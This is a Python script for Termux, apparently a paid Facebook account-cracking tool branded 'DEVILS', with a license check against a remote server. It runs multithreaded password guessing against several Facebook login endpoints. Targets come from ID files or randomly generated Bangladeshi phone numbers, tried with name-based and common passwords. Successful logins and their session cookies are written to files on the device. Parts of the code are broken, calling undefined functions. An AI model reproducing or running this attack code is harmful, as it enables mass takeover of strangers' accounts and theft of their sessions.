import os,zlib
from os import system as osRUB
from os import system as cmd
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from os import path
from sys import exit as byy
from requests import post as get
os.system('clear')
os.system('termux-setup-storage')
os.system('ls '+'/sdcard '+'> .sd.txt')
os.system('clear')
rr = open('.sd.txt', 'r').read()
if not 'Android' in rr:
    os.system('rm -rf .sd.txt')
    print ('\nGive Permission First And Open Again')
    print ('\nPut This Comand > termux-setup-storage')
    os.system('clear')
    sys.exit()

os.system('xdg-open https://chat.whatsapp.com/DglmIjbFhqC66pS9j4CRxM')

try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')

import os, platform, time, sys
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
#os.system('pip install requests ')
#os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as devilswork
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=40).submit

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	open('/sdcard/....devils.txt','w').write(' ')
	os.system('touch .prox.txt')
except Exception as e:
	print(e)
	print('Allow Termux Permissions ! And Run Again ')
	exit()
try:
 prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()

#-----------------------ua---------------------------------
try:
 proxo= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/ua2.txt').text
 open('.proxo.txt','w').write(proxo)
except Exception as e:
 print('')
proxo=open('.proxo.txt','r').read().splitlines()

#-----------------------ua---------------------------------
try:
 proxod= requests.get('https://raw.githubusercontent.com/FB-KING/KING-PRO/main/ua.txt').text
 open('.proxod.txt','w').write(proxo)
except Exception as e:
 print('')
proxod=open('.proxod.txt','r').read().splitlines()

#-----userid-separate----#
def user_id(coki):
    c_user_index = coki.find('c_user=')
    if c_user_index != -1:
        user_id = coki[c_user_index + len('c_user='):]
        user_id = user_id.split(';')[0]  # Extract the user ID
    else:
        user_id = ""
    return user_id
 #-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')

class rm_storage:
    def __init__(self):
        self.key = str(os.geteuid())
        
    def url(self,key,keyx,data1=None):
        try:
            data = {"url":"https://devilsofficial.xyz/tds.php","key":key,"keyx":keyx,}
            return get(data["url"],data={data["keyx"]:data["key"],"data":data1})
        except:pass
    def key1(self):
        #check and insert 
        data=self.url(self.key,"key1")
        return data.text
    def key2(self):
        #key_value
        data=self.url(self.key,"key2")
        return data.text
    def key3(self):
        #key_i_value
        data=self.url(self.key,"key3")
        return data.text
    def key4(self):
        #key_if_name
        data=self.url(self.key,"key4")
        return data.text
    def key5(self):
        #message
        data=self.url(self.key,"key5")
        return data.text
    def key6(self):
        #bypass_try 
        data=self.url(self.key,"key6")
        return data.text
    def key7(self):
        #block
        data=self.url(self.key,"key7")
        return data.text
    def key8(self):
        #block_message
        data=self.url(self.key,"key8")
        return data.text
    def key9(self):
        #count
        data=self.url(self.key,"key9")
        return data.text
    def key10(self):
        #bypass_try++insert 
        data=self.url(self.key,"key10")
        return data.text
    def key11(self):
        #count++insert 
        data=self.url(self.key,"key11")
        return data.text
    def key12(self,data):
        #insert data
        data=self.url(self.key, "keyin",data)
        #print(data.text)
        return data.text

def enc (text):
    enctext = base64.b64encode(text.encode()).decode()
    enctext1 = base64.b64encode(enctext.encode()).decode()
    return enctext1
dsid= "DEVILS"
uids = str(os.geteuid())
key = f"DEVILS61{uids}72XD"
apv = rm_storage()
keys=enc(key)


def bal():
    t = apv.key6()
    tk = apv.key8()
    if not t == "0":
        apv.key10()
        while True:
            print(tk)
              #print("print world")
        byy()
        exit()
    byy()
    exit()

def error(text):
    clear()
    print('\x1b[38;5;196m________________________________________________')
    print('\033[1;37mYour Key : \033[1;32m' + keys)
    print('\x1b[38;5;196m________________________________________________')
    print('\033[1;37m________________________________________________')
    print ('THIS TOOL IS PAID SO NEED GET APPROVAL') 
    print('\033[1;37m________________________________________________')
    print('\033[1;37mCOPY KEY SEND ADMIN GET PAID APPROVAL')
    linex()
    tks = ('Hello%20Devils-XD%20Owner%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+keys);os.system('am start https://wa.me/+8801925424329?text='+tks)
    byy()
    exit()

def clear():
    os.system('clear')
    print(logo)
######### erro########
try:
    version = requests.get('http://devilsofficial.xyz/version/zero.txt').text
except:
    exit()
version = version.strip()

android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/FLAME-CYBER-404/main1/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/FLAME-CYBER-404/main1/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

#============Capture Protection============#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\33[1;91mMethod Capture Off Kids ')     


try: 
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:print('Bypass User')


try:
    os.mkdir('/sdcard/DEVILS-IDS')
except:
    pass            
try:
    os.mkdir('/sdcard/DEVILS-IDS/file')
except:
    pass          
    
try:
    os.mkdir('/sdcard/DEVILS-IDS/Random')
except:
    pass          
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
ugen = []
ugen66 = []

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Redmi 5 Plus Build/OPM1.171019.019)'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def __UBI___():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y21', 'Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua

    
sys.stdout.write('\x1b]2; DEVILS\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
    
logo = (f"""\033[1;37mm8888b. d88888b db    db d888888b db      .d8888. 
\033[1;37m88  `8D 88'     88    88   `88'   88      88'  YP 
\033[1;37m88   88 88ooooo Y8    8P    88    88      `8bo.   
\033[1;32m88   88 88~~~~~ `8b  d8'    88    88        `Y8b. 
\033[1;32m88  .8D 88.      `8bd8'    .88.   88booo. db   8D 
\033[1;32m8888D' Y88888P    YP    Y888888P Y88888P `8888Y' 
\033[1;37m════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  DEVILS  XD
\033[1;32m  • \033[1;37m GitHub     :-  DEVILS404
\033[1;32m  • \033[1;37m Type       :-  PERSONAL 
\033[1;32m  • \033[1;37m Version    :-  {version}
════════════════════════════════════════════════""")
def clear():
    os.system("clear")
    print(logo)    
    
os.system('xdg-open https://chat.whatsapp.com/DglmIjbFhqC66pS9j4CRxM')

    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(48*'_')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(48*'_')
        input("Press enter to back devils Menu ")
        exit()



loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def devils():
    data = apv.key2()
    if not data == dsid+uids+"XD":
        error(keys)
        byy()
        exit()
    os.system('clear')
    print(logo)
    print(48*'_')
    print(f'[1] FILE CRACK')
    print(f'[2] RANDOM BANGLADESH')
    print(f'[3] RANDOM PAKISTAN')
    print(f'[4] RANDOM INDIA ')
    print(48*'_')
    print('')
    select = input('Select Menu>:\033[1;32m ')
    if select =='1':
        method_crack()
    if select =='2':
        rndm()
    if select =='3':
        rndmpak()
    if select =='4':
        rndm1()
    else:
        print('\n Select valid option ... ')
        devils()
        
def method_crack():
    clear()
    data = apv.key3()
    if not data == "DEVILS" + uids:
        error(key)
        byy()
        exit()

    data1 = apv.key4()
    if not data1 == "XD" + uids:
        error(key)
        byy()
        exit()

    data2 = data + data1
    if not ("DEVILS" and "XD") in data2:
        error(key)
        byy()
        exit()

    data = data + data1
    if not data == "DEVILS" + uids + "XD" + uids:
        bal()
        byy()
        exit()
    global methods
    clear()
    print(f'[1] Method Will be locked after 3 days')
    print(f'[2] Method life time ids ')
    print(f'[3] Method life time ids ')
    print(f'[4] Method life time ids ')
    print(f'[0] Back')
    print(48*'_')
    option = input('Select method>:\033[1;32m ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodE');main_crack().crack(id)
    elif option =='4':
        methods.append('methodF');main_crack().crack(id)
    elif option =='0':
        devils()
    else:
      print('\n\033[1;32m Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print('\033[37;1m________________________________________________')
        print('\033[33;1mEXAMPLE :- /sdcard/File Name ETC ...')
        print('\033[37;1m________________________________________________')
        self.file = input('\033[31;1mPut File Name :\033[1;32m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('\x1b[38;5;196mOpps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('\033[1;32mTry Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{S}[DEVILS-M1] {loop} | OK/CP {len(oks)}/{len(cps)}")
            #sys.stdout.write(f"\r{S}[DEVILS-M1] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ua_string=random.choice(ugen)
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'Host': 'b-graph.facebook.com', 
                 'x-fb-connection-bandwidth': '27449845', 
                 'x-fb-sim-hni': '38531',
                 'x-fb-net-hni': '20691',
                 'x-fb-connection-quality': 'EXCELLENT',
                 'user-agent': __UBI___(),
                 'content-type': 'application/x-www-form-urlencoded', 
                 'x-fb-http-engine': 'Liger'}
                print(headers)
                #print(headers)
                #Elite(__UBI___,sid,ps,cookie)
                #fike(__UBI___,sid,ps)
                rakib(sid,ps)
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{R}[DEVILS-OK] {sid} | {ps} {S} |{__UBI___()}")
                    Elite(__UBI___,sid,ps,cookie)
                    #xxd(sid,ps,cookie)
                    oks.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devils_OK-M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DEVILS-IDS/file/devils_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A}[DEVILS-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DEVILS-IDS/devil-cp.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            

    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r{S}[DEVILS-M4] {loop} | OK/CP {len(oks)}/{len(cps)}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(ugen)
                getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; CPH2059 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R}[devils-OK] {sid} | {ps} {S}")
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    oks.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-ok-coki.txt','a').write(sid+'|'+ps+'|'+coki+'\n')
                    open('/sdcard/DEVILS-IDS/file/devil-ok.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{A}[devils-CP] {sid} | {ps} {S}")
                    rakib(sid,ps)
                    cps.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-cp.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r{S}[DEVILS-M3] {loop} | OK/CP {len(oks)}/{len(cps)}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(ugen)
                getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R}[DEVILS-OK] {sid} | {ps} {S}")
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    oks.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-ok-coki.txt','a').write(sid+'|'+ps+'|'+coki+'\n')
                    open('/sdcard/DEVILS-IDS/file/devil-ok.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A}[DEVILS-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-cp.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
    
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r{S}[DEVILS-M2] {loop} | OK/CP {len(oks)}/{len(cps)}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(ugen)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R}[DEVILS-OK] {sid} | {ps} {S}")
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f' \033[37;1m Cookie : {coki}')
                    fike(__UBI___,sid,ps,coki)
                    oks.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-ok-coki.txt','a').write(sid+'|'+ps+'|'+coki+'\n')
                    open('/sdcard/DEVILS-IDS/file/devil-ok.txt','a').write(sid+'|'+ps+'\n')
                    time.sleep(0.3)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A}[DEVILS-CP] {sid} | {ps} {S}")
                    rakib(sid,ps,sua)
                    cps.append(sid)
                    open('/sdcard/DEVILS-IDS/file/devil-cp.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):
            pw = []
            clear()
            print('\033[37;1m________________________________________________')
            print('\033[1;32m EXAMPLE :- 1,2,3,4,5,6,7,8,9,10, ETC ')
            print('\033[37;1m________________________________________________')
            sl = int(input('\033[31;1mPassword Limit :\x1b[1;92m '))
            os.system("clear")
            print(logo)
            print('\033[37;1m________________________________________________')
            print(f'{S} \x1b[1;92m[Example: first123,last1122,firstlast,last,ETC')
            print('\033[37;1m________________________________________________')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[31;1mPassword {sr+1}:\x1b[1;92m '))
            os.system("clear")
            print(logo)
            #print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(f'{S}TOTAL IDS :\033[33;1m %s ' % len(self.id))
            print('\x1b[1;92mUSE FLIGHT AIRPLANE MODE BEFORE USE')
            print(48*'_')
            with devilswork(max_workers=50) as KINGworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            #pwx =  pw
                            pwx = ['57273200','59039200','57575759','57575752','57575751']
                            if 'methodA' in methods:
                                KINGworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                KINGworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                KINGworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                KINGworld.submit(self.methodD, uid, name, pwx)
                            elif 'methodE' in methods:
                                KINGworld.submit(self.methodF, uid, name, pwx)
                            elif 'methodF' in methods:
                                KINGworld.submit(self.methodF, uid, name, pwx)
                   except:pass
            result(oks,cps)   
def linex():
    print(48*'_')
def hack():
    print(48*'_')


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[] \033[1;92m  Your Active Apps  \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[] \033[1;96m  Your Expired Apps  \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            pass
def rndm():
    clear()
    data = apv.key3()
    if not data == "DEVILS" + uids:
        error(key)
        byy()
        exit()

    data1 = apv.key4()
    if not data1 == "XD" + uids:
        error(key)
        byy()
        exit()

    data2 = data + data1
    if not ("DEVILS" and "XD") in data2:
        error(key)
        byy()
        exit()

    data = data + data1
    if not data == "DEVILS" + uids + "XD" + uids:
        bal()
        byy()
        exit()
    uid=[]
    os.system('clear')
    print(logo)
    print('[] EXAMPLE : 017,016,019')
    linex()
    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    linex()
    print('[1] Method 1 \n[2] Method 2 \n[3] Method 3 \n[4] Method 4')
    linex()
    mthd=input(' SELECT: ')
    if mthd in ['1','2','3','4']:
        pass
    else:
        print('CHOICE ERROR ')
        rndm()
    os.system('clear')
    print(logo)
    print('\x1b[1;92m Example : 1000 , 5000 , 10000 , 50000 ,Etc')
    linex()
    limit = int(input('Put Limit :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        uid.append(nmp)
    with devilswork(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[◽] Total Acounts : '+tl)
        print('[◽] Selected Code : \x1b[1;92m'+kode)
        print('\x1b[1;91m[ ✈️ ] If you no result use flight mode')
        linex()
        for guru in uid:
            fid = '+88'+kode+guru
            pwx = [kode+guru[:3],kode+guru,kode+guru[:4],guru[1:],'bangladesh','i love you','free fire','@#@#@#','islam123','jannat','taniya','fariya','alamin','nadiya','foysal','nusrat','tamanna','rakib']
            if mthd =='1':
                yaari.submit(ram1,fid,pwx,tl)
            if mthd =='2':
                yaari.submit(ram2,fid,pwx,tl)
            if mthd =='3':
                yaari.submit(ram3,fid,pwx,tl)
            if mthd =='4':
                yaari.submit(ram4,fid,pwx,tl)
            
    linex()
    print('[√] Crack process has been completed')
    print('[√] Idz saved in [ok.txt,cp.txt]')
    linex()
    input('Press Enter To Go Back To Menu')
    devils()
    
def rndmpak():
    clear()
    data = apv.key3()
    if not data == "DEVILS" + uids:
        error(key)
        byy()
        exit()

    data1 = apv.key4()
    if not data1 == "XD" + uids:
        error(key)
        byy()
        exit()

    data2 = data + data1
    if not ("DEVILS" and "XD") in data2:
        error(key)
        byy()
        exit()

    data = data + data1
    if not data == "DEVILS" + uids + "XD" + uids:
        bal()
        byy()
        exit()
    uid=[]
    os.system('clear')
